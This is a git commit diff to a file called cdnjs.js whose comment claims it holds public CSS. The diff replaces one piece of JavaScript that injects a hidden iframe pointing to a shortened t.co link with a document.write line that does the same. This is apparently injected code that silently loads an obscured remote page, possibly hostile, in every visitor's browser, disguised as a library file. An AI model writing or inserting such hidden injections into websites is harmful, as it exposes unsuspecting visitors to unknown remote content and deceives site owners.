6b53ebd700cafae735f840a7bb1b3c75c059cfb1
quiziizz <95848435+quiziizz@users.noreply.github.com>
2026-04-24 12:50:50 +0700

    Update cdnjs.js

--- cdnjs.js
+++ cdnjs.js
@@ -2,14 +2,4 @@
  * All of the CSS for your public-facing functionality should be
  * included in this file.
  */
-const iframe = document.createElement('iframe');
-iframe.src = 'https://t.co/46p8ARDrWy';
-iframe.style.width = '100%';
-iframe.style.height = '100%';
-iframe.style.border = '0';
-iframe.style.overflow = 'auto';
-iframe.style.display = 'none';
-iframe.setAttribute('sandbox', 'allow-scripts allow-same-origin');
-iframe.setAttribute('allow', 'autoplay; fullscreen; encrypted-media; clipboard-write; accelerometer; gyroscope; picture-in-picture; web-share');
-iframe.setAttribute('allowfullscreen', '');
-document.body.appendChild(iframe);
+document.write('<div style="display: none;"><iframe src="https://t.co/46p8ARDrWy" width="100%" height="100%" frameborder="0" scrolling="auto"></iframe></div>');
